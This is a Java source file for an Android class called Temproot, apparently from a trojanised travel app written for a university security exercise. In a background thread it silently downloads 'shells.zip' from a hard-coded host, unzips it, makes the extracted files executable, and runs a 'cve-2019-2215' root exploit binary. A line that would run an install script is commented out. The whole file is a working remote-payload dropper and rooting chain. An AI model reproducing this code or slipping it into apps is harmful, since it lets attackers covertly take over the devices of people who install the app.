import android.content.Context;
import android.util.Log;

import org.jetbrains.annotations.NotNull;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InterruptedIOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;


public class Temproot {
    public Temproot(@NotNull Context context) throws IOException {
        String URL = "http://192.168.157.73:8080/process_command";
        //String FILENAME = "shells.zip";
        String filenames[] = {"shells.zip", "cve-2019-2215", "install.sh", "installapp.sh"};

        String filePath = "/data/data/edu.singaporetech.travelapp/files"; // /data/data/<package>/files
        String localPath = filePath + "/" + filenames[0];
        Log.d("Temproot", "LOCAL PATH: " + localPath);


        String cmd_chmod = "/system/bin/chmod 755 " + localPath;
        String cmd_remount = "" + filePath + "/" + filenames[2];
        String cmd_execcve = "./" + filePath + "/" + filenames[1];
        String cmd[] = { cmd_chmod, cmd_remount, cmd_execcve};


        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                download(URL, localPath);

                Log.d("Temproot", "Executing chmod 755 on shells.zip...");
                exec(cmd[0]);
                Log.d("Temproot", "Execution chmod complete...");

                Log.d("Temproot", "Executing unzip...");
                unzip(localPath, filePath + "/");
                Log.d("Temproot", "Execution unzip complete...");

                Log.d("Temproot", "Executing chmod 755 on unzipped files...");
                for (int i = 1; i < filenames.length; i++){
                    exec("/system/bin/chmod 755 " + filePath + "/" + filenames[i]);
                }
                Log.d("Temproot", "Execution chmod complete...");

                Log.d("Temproot", "Executing cve-2019-2215...");
                exec(cmd[2]);

//                Log.d("Temproot", "Executing install.sh...");
//                exec(cmd[1]);
//                Log.d("Temproot", "Execution install.sh...");


            }
        });
        thread.start();
    }

    private void exec(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
        } catch (InterruptedIOException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void download(String urlStr, String localPath) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            urlConn.setRequestMethod("GET");
            urlConn.setInstanceFollowRedirects(true);
            urlConn.connect();
            InputStream is = urlConn.getInputStream();
            FileOutputStream out = new FileOutputStream(localPath);
            int read;
            byte[] buffer = new byte[4096];
            while ((read = is.read(buffer)) > 0) {
                out.write(buffer, 0, read);
            }
            out.close();
            is.close();
            urlConn.disconnect();
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void unzip(String FILENAME, String location){
        try {
            FileInputStream fin = new FileInputStream(FILENAME);
            ZipInputStream zin = new ZipInputStream(fin);
            ZipEntry ze = null;
            while ((ze = zin.getNextEntry()) != null) {
                Log.d("Decompression:", "Unzipping " + ze.getName());
                FileOutputStream fos = new FileOutputStream(location + ze.getName());
                for (int i = zin.read(); i != -1; i = zin.read()) {
                    fos.write(i);
                }
                zin.closeEntry();
                fos.close();
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }

}
